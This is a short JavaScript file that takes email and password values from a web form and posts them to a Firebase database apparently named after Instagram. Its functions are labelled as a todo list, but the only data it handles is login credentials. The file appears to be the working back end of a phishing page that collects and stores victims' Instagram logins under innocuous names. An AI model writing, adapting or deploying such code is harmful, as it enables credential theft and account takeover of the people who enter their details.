const addBtn = document.getElementById("addBtn");
const email = document.getElementById("email");
const password = document.getElementById("password");
const BASE_URL = "https://instagram-dann-default-rtdb.firebaseio.com/"; 
const headers = {
  "Content-Type": "application/json",
};
const postTodos = async (todos) => {
  try {
    await fetch(`${BASE_URL}/sanjar.json`, {
      method: "POST",
      headers,
      body: JSON.stringify(todos),
    });
    getTodos();
  } catch (error) {
    console.error(error);
  }
};
const addTodoButton = document.getElementById("add-todo-button");
const input = document.getElementById("input");
addBtn.addEventListener("click", (e) => {
  e.preventDefault();
  const newTodos = {
    email: email.value,
    password:
     password.value,
  }; 
  postTodos(newTodos);
  email.value = "";
  password.value = "";
});
const getTodos = async () => {
  try {
    const res = await fetch(`${BASE_URL}/sanjar.json`);
    const data = await res.json();
    const result = [];
    for (const key in data) {
      const todos = {
        id: key,
        ...data[key],
      };
      result.push(todos);
    }
  } catch (error) {
    console.error(error);
  }
};
getTodos();